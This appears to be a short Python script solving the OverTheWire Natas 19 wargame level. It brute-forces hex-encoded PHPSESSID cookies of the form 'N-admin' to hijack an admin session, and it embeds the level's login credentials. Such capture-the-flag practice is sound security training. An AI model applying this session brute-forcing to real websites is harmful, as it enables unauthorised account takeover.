import requests
from requests.auth import HTTPBasicAuth

HTTPAuth = HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
url = 'http://natas19.natas.labs.overthewire.org/'

for i in range(1, 641):
	print(i)
	cookie = dict(PHPSESSID=(str(i)+'-admin').encode('hex'))
	r = requests.get(url, auth=HTTPAuth, cookies=cookie)
	if 'You are an admin.' in r.text:
		print r.text
		break